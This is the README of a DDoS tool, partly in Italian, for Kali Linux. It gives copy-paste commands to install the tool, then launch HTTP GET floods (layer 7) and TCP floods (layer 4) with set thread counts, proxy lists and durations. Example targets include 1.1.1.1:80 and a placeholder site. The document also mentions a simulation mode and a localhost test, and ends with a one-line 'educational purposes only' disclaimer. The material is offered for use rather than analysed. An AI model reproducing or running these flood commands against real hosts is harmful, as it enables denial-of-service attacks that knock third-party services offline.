# DDOS INFINITY X — Kali Linux (copy & paste)

**Repository:** https://github.com/Infinity-X202/DDOS-INFINITY-X  
**Author:** adil fayyaz

---

## Install & run (recommended)

Copy and paste **all lines** in your Kali terminal:

```bash
cd ~
rm -rf DDOS-INFINITY-X
git clone https://github.com/Infinity-X202/DDOS-INFINITY-X.git
cd DDOS-INFINITY-X
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
python3 start.py HELP
```

After install, every time you open a new terminal:

```bash
cd ~/DDOS-INFINITY-X
source venv/bin/activate
python3 start.py HELP
```

---

## Menu 1 2 3 4

```bash
python3 start.py MENU
```

| Num | Azione |
|-----|--------|
| **1** | Attacco L7 **GET** — solo URL (premi Invio = 1) |
| **2** | Attacco L4 **TCP** — solo ip:port |
| **3** | Tools |
| **4** | Lista metodi |
| **0** | Esci |
| **5** | **Simulazione** (sembra attacco reale, zero traffico) |

**Solo demo (sicuro):**

```bash
python3 start.py SIM http://127.0.0.1:8080/
```

Diretto senza menu:

```bash
python3 start.py 1 http://TUO-SITO.com
python3 start.py 2 1.1.1.1:80
```

---

## Test su localhost (se `1` non funziona)

**Terminale 1** — avvia un server di prova sulla porta **8080**:

```bash
cd ~/DDOS-INFINITY-X
python3 -m http.server 8080
```

**Terminale 2**:

```bash
cd ~/DDOS-INFINITY-X
source venv/bin/activate
git pull
touch files/proxies/http.txt
python3 start.py 1 http://127.0.0.1:8080/
```

Devi vedere: `Local lab target — running without proxies` e poi `Attack Started`.

Se compare `Proxy Check failed` → `git pull` + `touch files/proxies/http.txt` e riprova.

Se compare `Connection refused` → il server nel terminale 1 non è avviato o porta sbagliata (usa **8080** in entrambi).

---

## Commands

```bash
python3 start.py HELP
python3 start.py tools
python3 start.py GET http://example.com 0 1000 http.txt 10 100
python3 start.py TCP 1.1.1.1:80 500 60
python3 start.py STOP
```

Full list: [COMMANDS.md](../COMMANDS.md)

---

## Update project

```bash
cd ~/DDOS-INFINITY-X
git pull
source venv/bin/activate
python3 start.py HELP
```

---

## If pip fails

```bash
sudo apt update
sudo apt install -y python3 python3-venv python3-pip python3-dev git build-essential
```

Then run the install block again from the top.

---

For educational purposes only.
